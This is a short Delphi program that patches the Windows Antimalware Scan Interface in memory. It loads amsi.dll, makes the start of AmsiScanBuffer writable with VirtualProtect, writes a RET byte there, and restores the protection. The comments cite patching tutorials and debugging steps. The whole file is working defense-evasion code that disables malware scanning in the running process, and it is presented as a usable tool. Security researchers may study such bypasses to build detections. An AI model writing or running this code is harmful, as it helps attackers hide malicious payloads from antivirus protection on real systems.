program BasedAmsi_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
https://delphi.cjcsoft.net/viewthread.php?tid=42761&extra=page%3D1
}

uses
  System.SysUtils,
  Windows
  ;

var
  PidHandle: integer;
  PidID : integer;
  Written: UIntPtr;
  lib : THandle;
  asb : Pointer;
  NumWrote : SIZE_T;
  //OldProtect : DWord;
  OldProtect : DWord;
  RET : Byte = $C3;



//Add bps
//Step to load
//Save bin of amsi.dll in memory
//Step past Protect,Patch,ReProtect
//Save bin of amsi.dll in memory
//$(cmp pre-patch.bin post-patch.bin)


begin
  try
  //Load and get base address for AmsScanBuffer
    lib := LoadLibrary('amsi.dll');
    asb := GetProcAddress(lib,'AmsiScanBuffer');
    WriteLn(Format('[+] amsi.dll base address: %p',[asb]));
    //amsi.dll base address at   0000-7FF9-E16E-35E0
    //ScanStringBuffer Loaded at 0000-0000-0000-25e0 inside RX region of 2nd image


  //Change memory protection to RWX
    WriteLn('[+] Attempting to change protections');
    ////VirtualProtect(asb, UIntPtr(SizeOf(garbage)), 64, 0);
    VirtualProtect(asb, 1, 64, OldProtect);
    WriteLn('[+] RWX protected');

  //Write to memory @ pter
    WriteLn('[+] Patching with RET (0xC3) of length ', SizeOf(RET));
    Move(RET, asb^, 1);

    //WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
    WriteLn('[+] Written RET To the start of ScanStringBuffer');

  //Change memory protection to RX
    VirtualProtect(asb, 1, OldProtect, OldProtect);
    //VirtualProtect(asb, 1, 4, 0);
    WriteLn('[+] RX protected');


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.

